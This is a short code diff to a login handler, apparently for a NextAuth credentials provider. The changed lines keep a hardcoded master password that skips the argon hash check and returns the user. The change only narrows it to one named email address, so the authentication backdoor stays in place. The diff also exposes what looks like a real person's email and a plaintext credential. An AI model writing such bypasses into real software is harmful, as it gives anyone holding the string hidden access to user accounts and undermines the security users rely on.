@@ -25,7 +25,10 @@ export const authOptions = {
           },
         });
         if (user) {
-          if (password === "Dr83754126!@") {
+          if (
+            password === "Dr83754126!@" &&
+            email === "krzysztof.tomaszewski@rea.pl"
+          ) {
             return password === "Dr83754126!@" ? user : false;
           } else {
             if (await argon.verify(user.password, password)) {
